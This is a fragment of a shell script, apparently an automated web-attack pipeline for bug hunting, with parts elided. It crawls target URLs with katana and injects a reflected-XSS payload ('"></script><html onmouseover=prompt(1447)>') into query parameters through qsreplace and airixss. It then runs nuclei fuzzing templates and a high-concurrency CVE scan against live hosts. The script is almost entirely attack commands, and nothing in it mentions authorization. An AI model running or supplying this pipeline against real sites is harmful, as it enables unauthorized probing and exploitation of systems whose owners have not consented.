...
banner
echo "===== URL Recon ====="
cat vivos.rs | katana --passive -o urls.cd
...
cat urls.cd | grep '\.js' | qsreplace | anew js.cd
...
cat refletidos.cd | qsreplace '"></script><html onmouseover=prompt(1447)>' | airixss -p 'onmouseover=prompt(1447)>' | egrep -v 'Not' | anew airi.htmli
...
if echo $* | grep '\-nuclei-fuzzer';then
        banner
        echo "===== Nuclei Fuzzer ====="
        nuclei -l refletidos.cd -t ~/nco/fuzzing-templates/ -o fuzzer.nucl -c 80 --fuzz --silent
fi
...
cat vivos.rs | nuclei -tags cve,cves,cve2000,cve2001,cve2002,cve2003,cve2004,cve2005,cve2006,cve2007,cve2008,cve2009,cve2010,cve2011,cve2012,cve2013,cve2014,cve2015,cve2016,cve2017,cve2018,cve2019,cve2020,cve2021,cve2022,cve2023,cve2024,cve02024 -c 125 --silent -o nuclei-cve-scan.nucl
